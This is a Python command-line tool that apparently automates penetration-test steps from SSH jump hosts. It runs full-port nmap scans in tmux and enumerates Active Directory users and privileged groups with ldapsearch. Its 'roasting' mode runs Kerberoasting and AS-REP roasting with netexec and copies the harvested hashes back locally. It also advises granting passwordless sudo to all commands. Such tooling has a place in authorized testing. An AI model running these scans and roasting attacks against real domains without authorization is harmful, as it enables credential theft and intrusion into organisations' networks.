import subprocess
import sys
import argparse
from pathlib import Path
import yaml
import time

class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

def color_text(text: str, color: str) -> str:
    """Return colored text if output is a terminal, otherwise plain text."""
    return f"{color}{text}{Color.END}" if sys.stdout.isatty() else text


def check_ssh_config(host):
    """Check if the host exists in SSH config"""
    ssh_config = Path.home() / '.ssh' / 'config'

    if not ssh_config.exists():
        return False

    with open(ssh_config, 'r') as f:
        for line in f:
            if line.strip().lower().startswith('host ') and host in line.lower():
                return True
    return False

def load_config(yaml_file):
    """Load and validate YAML configuration"""
    try:
        with open(yaml_file, 'r') as f:
            config = yaml.safe_load(f)
    except FileNotFoundError:
        sys.exit(f"Error: Config file {yaml_file} not found")
    except yaml.YAMLError as e:
        sys.exit(f"Error in YAML file: {e}")

    # Validate required fields
    if 'hosts' not in config:
        raise ValueError("Configuration must contain 'hosts' section")

    for host_config in config['hosts']:
        if 'name' not in host_config:
            raise ValueError("Each host must have a 'name'")
        if 'scans' not in host_config or not host_config['scans']:
            raise ValueError(f"Host {host_config['name']} must have at least one scan")

        for scan in host_config['scans']:
            if 'target' not in scan:
                raise ValueError("Each scan must have a 'target'")

    return config

def process_host(host_config):
    host_name = host_config['name']
    scans = host_config['scans']

    scan_file = ''

    for scan in scans:
        # print(type(scan))
        # print(scan)

        if len(scan_file) == 0:
            scan_file = f'sudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan['scan_name']}.tcp {scan['target']}'
            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan['scan_name']}.udp {scan['target']}'
        else:
            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan['scan_name']}.tcp {scan['target']}'
            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan['scan_name']}.udp {scan['target']}'

    return scan_file


def run_ssh_command(host, command):
    try:
        ssh_command = [
            'ssh',
            '-F', str(Path.home() / '.ssh/config'),
            host,
            command
        ]
        result = subprocess.run(ssh_command, capture_output=True, text=True)
        return (True, result.stdout)
    except subprocess.CalledProcessError as e:
        return (False, e.stderr)

def copy_files(file1, file2):
    try:
        ssh_command = [
            'scp',
            '-F', str(Path.home() / '.ssh/config'),
            file1,
            file2
        ]
        result = subprocess.run(ssh_command, capture_output=True, text=True)
        return (True, result.stdout)
    except subprocess.CalledProcessError as e:
        return (False, e.stderr)

def validate_access(config):
    # Check required programs
    requirements = {
        'nmap': {
            'cmd': 'command -v nmap',
            'fix': 'sudo apt install -y nmap'
        },
        'tmux': {
            'cmd': 'command -v tmux',
            'fix': 'sudo apt install -y tmux'
        },
        'parallel': {
            'cmd': 'command -v parallel',
            'fix': 'sudo apt install -y parallel'
        },
        'sudo_nopasswd': {
            'cmd': 'sudo -n true',
            'fix': 'Run "sudo visudo" and add: "USER ALL=(ALL) NOPASSWD: ALL"'
        }
    }

    for host_config in config['hosts']:
        host_name = host_config['name']
        print(f"\n{color_text('Checking requirements on:', Color.BOLD)} {host_name}")

        # Check requirements
        wrong_stuff = []
        if not check_ssh_config(host_name):
            name = 'ssh config'
            status = color_text("✗", Color.RED)
            print(f"  {status} {name.capitalize().ljust(12)}: {host_name} Missing!")
            sys.exit(1)

        for tool in requirements:
            trial = run_ssh_command(host_name, requirements[tool]['cmd'])

            if tool == 'sudo_nopasswd':
                if len(trial[1]) != 0:
                    wrong_stuff.append(tool)
            else:
                if len(trial[1]) == 0:
                    wrong_stuff.append(tool)

        if wrong_stuff:
            print(color_text("\n  Missing requirements:", Color.YELLOW))
            for item in wrong_stuff:
                print(f" {item}  -  Missing! ")

            if 'nmap' in wrong_stuff or 'tmux' in wrong_stuff or 'parallel' in wrong_stuff:
                print("\n  Install packages with:")
                print(color_text("$ sudo apt update && sudo apt install -y nmap tmux parallel", Color.GREEN))

            if 'sudo_nopasswd' in wrong_stuff:
                print("\n    Configure passwordless sudo with:")
                print(color_text("      $ sudo visudo", Color.GREEN))
                print("    Then add this line (replace USER with your username):")
                print(color_text("      USER ALL=(ALL) NOPASSWD: ALL", Color.GREEN))

        else:
            print(color_text("\n  Requirements met.", Color.GREEN))

        # Show planned scans
        print(color_text("\n  Planned scans:", Color.BOLD))
        for scan in host_config['scans']:
            privileged = scan.get('privileged', False)
            priv_text = color_text(" (privileged)", Color.YELLOW) if privileged else ""
            print(f"    - {scan['target']}{priv_text}")
            print(f"      Command: nmap {scan.get('nmap_args', '-sV -T4')}")
            if privileged and 'sudo_nopasswd' in wrong_stuff:
                print(color_text("      WARNING: Privileged scan requires sudo without password!", Color.RED))

    if not wrong_stuff:
        print(color_text("\nAll systems go! All requirements are met.", Color.GREEN))
    else:
        print(color_text("\nWARNING: Some requirements are missing. See above for details.", Color.RED))
        exit()

def start_nmaps(scan_file, host):
    # define ssh host
    host_name = host['name']

    # create local directory
    create_local_dir = ['mkdir', f'{host_name}-segtest']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)

    # create remote directory
    run_ssh_command(host_name, 'mkdir segtest')

    # save full commands file locally
    with open(f'{host_name}-segtest/full_nmap.xargs', 'w') as f:
        f.write(scan_file)

    # transfer commands file on the remote
    cp = copy_files(f'{host_name}-segtest/full_nmap.xargs', f'{host_name}:~/segtest/full_nmap.xargs')

    try:
        xargs = f'xargs -P {host['parallel']}'
    except:
        xargs = f'xargs -P 2'

    command = 'cat segtest/full_nmap.xargs | '+xargs+' -I {} sh -c "{}"'


    tmux_command = f"tmux new-session -d -s 'seg-scans' '{command}'"


    execute = run_ssh_command(host_name, tmux_command)

    print(f"\nScan started in tmux session 'nmap_scan' on {host_name}!")
    print(f"Results will be saved to ~/segtest directory on the remote host.")
    print(f"\nTo attach to the tmux session: \nssh {host_name} && tmux attach -t seg-scans")

def checker(host):
    for targets in host['scans']:

        command = f'tail -n 1 segtest/{targets['scan_name']}*.xml'

        # print(command[1])
        results = run_ssh_command(host['name'], command) 
        print(results[1])
        # print(targets)
        
def en_users(jh, dc_ip, user, password, domain):
    domain = domain.split('.')

    dns = ''
    for item in domain:
        if len(dns) == 0:
            dns += 'dc='+item
        else:
            dns += ',dc='+item
    
    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > enabled_users"

    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > high_priv_users"

    command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users_descriptions"""

    en = run_ssh_command(jh, command1)
    print('Enabled users gathered!')
    en_adm = run_ssh_command(jh, command2)
    print('High privilege users gathered!')
    us_desc = run_ssh_command(jh, command3)
    print('Users and their description gathered!')

    # create local directory
    create_local_dir = ['mkdir', f'enabled-users']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)
    
    copy_files(f'{jh}:~/enabled_users', f'enabled-users/enabled_users')
    copy_files(f'{jh}:~/high_priv_users', f'enabled-users/high_priv_users')
    copy_files(f'{jh}:~/users_descriptions', f'enabled-users/users_descriptions')

def roasting(jh, dc_ip, user, password, domain):
    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting kerberoasted-users"
    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast asreproasted-users"

    kerb = run_ssh_command(jh, kerb_cmd)
    print('Performing kerberoasting!')
    asrep = run_ssh_command(jh, asrep_cmd)
    print('Performing ASREPRoasting!')
    
    # create local directory
    create_local_dir = ['mkdir', f'roasting']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)
    
    copy_files(f'{jh}:~/kerberoasted-users', f'roasting/kerberoasted-users')
    copy_files(f'{jh}:~/asreproasted-users', f'roasting/asreproasted-users')
    
def main():
    parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
    subparsers = parser.add_subparsers(dest="mode", required=True, help="Select a mode")

    launch_parser = subparsers.add_parser("launch-scans", help="Launch scans mode")
    launch_parser.add_argument("config_file", help="Path to YAML configuration file")

    monitor_parser = subparsers.add_parser("monitor-scans", help="Monitor scans mode")
    monitor_parser.add_argument("config_file", help="Path to YAML configuration file")
    
    results_parser = subparsers.add_parser("scan-results", help="Show scan results")
    results_parser.add_argument("config_file", help="Path to YAML configuration file")
    
    subparsers.add_parser("start-responder", help="Start responder tool")
    subparsers.add_parser("parse-scans", help="Parse scan results")

    users_parser = subparsers.add_parser("users", help="Grab all enabled and all high priv users on the target AD domain.")
    users_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
    users_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
    users_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
    users_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
    users_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")

    roasting_parser = subparsers.add_parser("roasting", help="ASREPRoasting and Kerberoasting on the target AD domain.")
    roasting_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
    roasting_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
    roasting_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
    roasting_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
    roasting_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")    


    # parser.add_argument("mode", choices=["launch-scans", "monitor-scans", "scan-results", "start-responder", "parse-scans", "users"], help=" select one of the following <launch|monitor|results>")
    # parser.add_argument("config_file", help="Path to YAML configuration file")


    args = parser.parse_args()



    if args.mode == 'launch-scans':
        config = load_config(args.config_file)
        validate_access(config)

        # Process each host in sequence (parallelism is per-host) it will start the scans with xargs and with a default of 2 processes per host or more if you devine them in the config file
        for host_config in config['hosts']:
            scans = process_host(host_config)
            start_nmaps(scans, host_config)

    if args.mode == 'monitor-scans': # check wether scans finished or not
        config = load_config(args.config_file)

        print('monitoring NOW !!!')

        while True:
            for host in config['hosts']:
                print(f"\n{color_text('Checking status scans on:', Color.BOLD)} {host['name']}")
                checker(host)
            time.sleep(10)

    if args.mode == 'scan-results':
        config = load_config(args.config_file)
        for host in config['hosts']:
            print(f"\n{color_text('Downloading scans from:', Color.BOLD)} {host['name']}")


    if args.mode == 'users':
        en_users(args.jumphost, args.dc_ip, args.user, args.password, args.domain)

    if args.mode == 'roasting':
        roasting(args.jumphost, args.dc_ip, args.user, args.password, args.domain)        

if __name__ == "__main__":
    main()
